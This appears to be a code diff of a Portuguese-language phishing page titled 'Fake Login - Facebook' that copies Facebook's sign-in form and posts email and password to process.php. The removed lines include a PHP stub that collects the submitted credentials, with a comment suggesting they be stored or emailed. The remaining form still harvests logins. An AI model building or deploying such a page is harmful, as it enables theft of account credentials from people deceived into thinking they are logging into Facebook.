@@ -1,62 +1,16 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Fake Login - Facebook</title>
-    <link rel="stylesheet" href="styles.css"><body {
-    font-family: Arial, sans-serif;
-    background-color: #f0f2f5;
-}
-
-.login-container {
-    width: 300px;
-    margin: 100px auto;
-    padding: 20px;
-    background-color: #fff;
-    border-radius: 8px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-}
-
-h2 {
-    text-align: center;
-    color: #1877f2;
-}
-
-input[type="email"],
-input[type="password"] {
-    width: 100%;
-    padding: 10px;
-    margin-bottom: 10px;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-}
-
-button {
-    width: 100%;
-    padding: 10px;
-    background-color: #1877f2;
-    color: #fff;
-    border: none;
-    border-radius: 4px;
-    cursor: pointer;
-}
-
-button:hover {
-    background-color: #166fe5;
-}
+    <link rel="stylesheet" href="styles.css"> <!-- Arquivo CSS para estilização -->
 </head>
 <body>
 
     <div class="login-container">
         <h2>Faça login no Facebook</h2>
-        <form action="process.php" method="POST"> <?php
-    $email = $_POST['email'];
-    $password = $_POST['password'];
-
-    // Aqui você pode fazer o que quiser com as credenciais, como armazená-las em um banco de dados ou enviá-las por e-mail
-    // Por questões de segurança, nunca armazene senhas em texto simples
-?>
+        <form action="process.php" method="POST"> <!-- Arquivo PHP para processar os dados -->
             <input type="email" name="email" placeholder="Endereço de e-mail" required>
             <input type="password" name="password" placeholder="Senha" required>
             <button type="submit">Entrar</button>
